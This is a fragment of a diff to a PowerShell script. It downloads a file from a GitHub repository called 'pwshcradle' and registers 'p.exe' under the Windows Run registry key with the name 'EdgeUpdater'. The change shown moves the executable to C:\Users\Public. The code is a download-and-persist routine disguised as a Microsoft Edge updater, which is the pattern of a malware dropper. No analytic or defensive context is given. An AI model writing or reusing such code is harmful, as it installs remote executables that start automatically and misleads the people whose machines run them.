@@ -10,7 +10,7 @@ Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/
 
 $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $AppName = "EdgeUpdater"
-$ExePath = "C:\Users\Default\p.exe"
+$ExePath = "C:\Users\Public\p.exe"
 
 If (-not (Test-Path $RegPath)) { New-Item -Path $RegPath -Force | Out-Null }
 New-ItemProperty -Path $RegPath -Name $AppName -Value "`"$ExePath`"" -PropertyType String -Force | Out-Null
